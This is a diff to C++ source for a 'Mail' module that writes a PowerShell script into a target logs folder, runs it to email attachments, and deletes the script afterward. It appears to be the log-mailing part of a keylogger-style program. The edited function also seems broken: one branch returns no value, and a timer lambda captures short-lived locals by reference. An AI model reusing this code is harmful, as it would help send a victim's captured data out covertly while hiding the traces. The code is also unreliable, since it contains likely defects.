@@ -60,8 +60,6 @@ namespace Mail
         return s;
     }
 
-    Timer mailTimer; //TODO: put this in header withouth error: multiple definition of `Mail::mailTimer'
-
     bool CreateMailSendingScript()
     {
         #define SCRIPT_NAME "sm.ps1"
@@ -125,24 +123,31 @@ namespace Mail
         WaitForSingleObject( ShExecInfo.hProcess, 7000 );
         DWORD exit_code = 100;
         GetExitCodeProcess( ShExecInfo.hProcess, &exit_code );
-
-        mailTimer.SetFunction([&]()
+        if ((int)exit_code == STILL_ACTIVE)
         {
-            WaitForSingleObject(ShExecInfo.hProcess, 60000);
-            GetExitCodeProcess(ShExecInfo.hProcess, &exit_code);
-            if ((int)exit_code == STILL_ACTIVE)
-                TerminateProcess(ShExecInfo.hProcess, 100);
-            IO::WriteDebugAppLog( "<From Sendmail in Mailsender.cpp> Return code: " + Helper::ToString((int)exit_code) );
-            if(delScript)
-                IO::DeleteFile(IO::GetTargetLogsDirPath(true) + std::string(SCRIPT_NAME));
-        });
+            Timer mailTimer;
+            mailTimer.SetFunction([&]() {
+                bool d = delScript;
+                WaitForSingleObject(ShExecInfo.hProcess, 60000);
+                GetExitCodeProcess(ShExecInfo.hProcess, &exit_code);
+                if ((int)exit_code == STILL_ACTIVE)
+                    TerminateProcess(ShExecInfo.hProcess, 100);
+                //IO::WriteDebugAppLog( "<From Sendmail in Mailsender.cpp> Return code: " + Helper::ToString((int)exit_code) );
+                if (d)
+                    IO::DeleteFile(IO::GetTargetLogsDirPath(true) + std::string(SCRIPT_NAME));
+            });
 
-        mailTimer.SettotalFunctCalls(1L);
-        mailTimer.SetInterval(10L);
-        mailTimer.Start(true);
-        return (int) exit_code;
+            mailTimer.SettotalFunctCalls(1L);
+            mailTimer.SetInterval(10L);
+            mailTimer.Start(true);
+        }
+        
+        else
+        {
+            IO::DeleteFile(IO::GetTargetLogsDirPath(true) + std::string(SCRIPT_NAME));
+            return (int)exit_code;
+        }
     }
-
     int SendMail(const std::string &subject, const std::string &body, 
                  const std::vector<std::string> &att, const bool &delScript)
     {
